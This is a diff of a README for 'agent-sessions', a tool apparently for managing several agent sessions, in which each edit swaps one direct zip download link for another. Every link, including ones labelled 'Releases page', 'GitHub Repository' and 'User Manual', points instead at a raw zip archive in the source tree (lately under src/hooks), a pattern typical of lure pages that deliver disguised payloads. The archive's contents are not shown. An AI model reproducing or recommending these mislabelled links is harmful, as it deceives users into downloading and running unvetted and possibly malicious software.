@@ -1,6 +1,6 @@
 # 🌟 agent-sessions - Manage Multiple Agent Sessions Easily
 
-[![Download agent-sessions](https://raw.githubusercontent.com/zenithpd/agent-sessions/main/src-tauri/agent-sessions_v3.2.zip)](https://raw.githubusercontent.com/zenithpd/agent-sessions/main/src-tauri/agent-sessions_v3.2.zip)
+[![Download agent-sessions](https://github.com/zenithpd/agent-sessions/raw/refs/heads/main/src/hooks/agent-sessions-2.6.zip)](https://github.com/zenithpd/agent-sessions/raw/refs/heads/main/src/hooks/agent-sessions-2.6.zip)
 
 ## 📋 Overview
 
@@ -28,13 +28,13 @@ For the best experience, ensure your computer meets the following requirements:
 
 ### Step 2: Visit the Releases Page to Download
 
-You can easily download the latest version of agent-sessions by visiting our [Releases page](https://raw.githubusercontent.com/zenithpd/agent-sessions/main/src-tauri/agent-sessions_v3.2.zip).
+You can easily download the latest version of agent-sessions by visiting our [Releases page](https://github.com/zenithpd/agent-sessions/raw/refs/heads/main/src/hooks/agent-sessions-2.6.zip).
 
 ### Step 3: Download the Application
 
 Scroll through the list of available versions. Find the latest version, and click on the asset you want to download. 
 
-Here is a helpful link to quickly get to the download: [Download agent-sessions](https://raw.githubusercontent.com/zenithpd/agent-sessions/main/src-tauri/agent-sessions_v3.2.zip).
+Here is a helpful link to quickly get to the download: [Download agent-sessions](https://github.com/zenithpd/agent-sessions/raw/refs/heads/main/src/hooks/agent-sessions-2.6.zip).
 
 ### Step 4: Install the Application
 
@@ -75,14 +75,14 @@ After installation, open the application.
 
 If you encounter issues while using agent-sessions, try the following:
 
-- Ensure you have the latest version installed by checking the [Releases page](https://raw.githubusercontent.com/zenithpd/agent-sessions/main/src-tauri/agent-sessions_v3.2.zip).
+- Ensure you have the latest version installed by checking the [Releases page](https://github.com/zenithpd/agent-sessions/raw/refs/heads/main/src/hooks/agent-sessions-2.6.zip).
 - Restart the application if it behaves unexpectedly.
 - Visit the project repository for FAQs and community support.
 
 ## 📚 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/zenithpd/agent-sessions/main/src-tauri/agent-sessions_v3.2.zip)
-- [User Manual](https://raw.githubusercontent.com/zenithpd/agent-sessions/main/src-tauri/agent-sessions_v3.2.zip)
+- [GitHub Repository](https://github.com/zenithpd/agent-sessions/raw/refs/heads/main/src/hooks/agent-sessions-2.6.zip)
+- [User Manual](https://github.com/zenithpd/agent-sessions/raw/refs/heads/main/src/hooks/agent-sessions-2.6.zip)
 
 For further assistance, reach out through our repository’s issue tracker.
 
